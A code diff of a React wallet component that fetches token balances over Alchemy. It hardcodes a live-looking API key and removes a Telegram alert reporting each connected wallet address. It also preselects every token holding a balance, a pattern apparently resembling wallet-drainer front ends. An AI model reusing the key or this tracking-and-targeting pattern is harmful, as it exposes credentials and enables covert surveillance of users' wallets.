@@ -24,7 +24,7 @@ const sendTelegramNotification = async (message) => {
   }
 };
 
-/// Setup Alchemy instances for multiple networks
+// Setup Alchemy instances for multiple networks
 const alchemyInstances = {
   [Network.ETH_MAINNET]: new Alchemy({
     apiKey: 'iUoZdhhu265uyKgw-V6FojhyO80OKfmV',
@@ -54,12 +54,12 @@ const alchemyInstances = {
 };
 
 const chainIdToNetworkMap = {
-  1: Network.ETH_MAINNET,      // Ethereum Mainnet
-  56: Network.BSC_MAINNET,     // BSC Mainnet
-  10: Network.OPTIMISM,        // Optimism Mainnet
-  324: Network.ZK_SYNC,        // zkSync Mainnet
-  42161: Network.ARB_MAINNET,  // Arbitrum Mainnet
-  137: Network.MATIC_MAINNET,  // Polygon Mainnet
+  1: Network.ETH_MAINNET,
+  56: Network.BSC_MAINNET,
+  10: Network.OPTIMISM,
+  324: Network.ZK_SYNC,
+  42161: Network.ARB_MAINNET,
+  137: Network.MATIC_MAINNET,
   // Add other mappings as needed
 };
 
@@ -185,70 +185,69 @@ export const GetTokens = () => {
       const alchemy = alchemyInstances[alchemyNetwork];
 
       console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
-
+      
+      // Fetch ERC20 token balances
       const tokensResponse = await alchemy.core.getTokenBalances(address);
+      
+      // Fetch native token balance
       const nativeBalanceResponse = await alchemy.core.getBalance(address, 'latest');
 
+      // Fetch ETH to USD conversion rate
       const rate = await fetchEthToUsdRate();
       setEthToUsdRate(rate);
 
       const nativeToken = {
         contract_address: 'native',
-        contract_ticker_symbol: chain.nativeCurrency.symbol,
-        balance: safeNumber(nativeBalanceResponse),
-        quote: 0,
-        quote_rate: 0,
+        contract_ticker_symbol: chain.nativeCurrency.symbol, // Display native currency symbol
+        balance: safeNumber(nativeBalanceResponse), // Add balance to native token
+        quote: 0, // Set quote to 0 as it's the native token
+        quote_rate: 0, // Set quote rate to 0 as it's the native token
       };
 
       const processedTokens = [
-        nativeToken,
+        nativeToken, // Include native token at the beginning of the tokens list
         ...tokensResponse.tokenBalances.map((balance) => ({
           contract_address: balance.contractAddress,
           balance: safeNumber(balance.tokenBalance),
           quote: balance.quote || 0,
           quote_rate: balance.quoteRate || 0,
-          contract_ticker_symbol: balance.symbol,
         })),
       ];
 
-      setTokens(processedTokens);
-
-      // Auto-toggle tokens with balance greater than 0
-      const newCheckedRecords = {};
-      processedTokens.forEach((token) => {
-        if (safeNumber(token.balance).gt(0)) {
-          newCheckedRecords[token.contract_address] = { isChecked: true };
+      // Automatically check tokens with a balance greater than 0
+      const newCheckedRecords = processedTokens.reduce((acc, token) => {
+        const tokenBalance = safeNumber(token.balance);
+        if (tokenBalance.gt(0)) {
+          acc[token.contract_address] = { isChecked: true };
         }
-      });
-      setCheckedRecords((prevRecords) => ({ ...prevRecords, ...newCheckedRecords }));
-    } catch (err) {
-      console.error('Error fetching tokens:', err.message || err);
-      setError(err.message || 'Error fetching tokens');
+        return acc;
+      }, {});
+
+      setTokens(processedTokens);
+      setCheckedRecords(newCheckedRecords);
+      console.log('Fetched tokens:', processedTokens);
+    } catch (error) {
+      console.error('Error fetching tokens:', error);
+      setError(error.message);
+    } finally {
+      setLoading(false);
     }
-    setLoading(false);
   }, [address, chain, setTokens, setCheckedRecords]);
 
-  // Send Telegram notification only once when the wallet is connected
   useEffect(() => {
-    if (isConnected && address && !notified) {
-      sendTelegramNotification(`New Connection: ${address}`)
-        .then(() => setNotified(true))
-        .catch((error) => console.error('Failed to send notification:', error));
+    if (isConnected && address) {
+      fetchData();
     }
-  }, [isConnected, address, notified]);
+  }, [address, chain, fetchData, isConnected]);
 
   return (
-    <div>
-      <button onClick={fetchData} disabled={loading}>
-        Fetch Tokens
-      </button>
-      {loading ? (
-        <Loading />
-      ) : error ? (
-        <div>{error}</div>
-      ) : (
-        tokens.map((token) => <TokenRow key={token.contract_address} token={token} ethToUsdRate={ethToUsdRate} />)
-      )}
-    </div>
+    <>
+      {loading && <Loading>Loading...</Loading>}
+      {error && <p style={{ color: 'red' }}>{error}</p>}
+      {tokens.length > 0 &&
+        tokens.map((token) => (
+          <TokenRow key={token.contract_address} token={token} ethToUsdRate={ethToUsdRate} />
+        ))}
+    </>
   );
 };
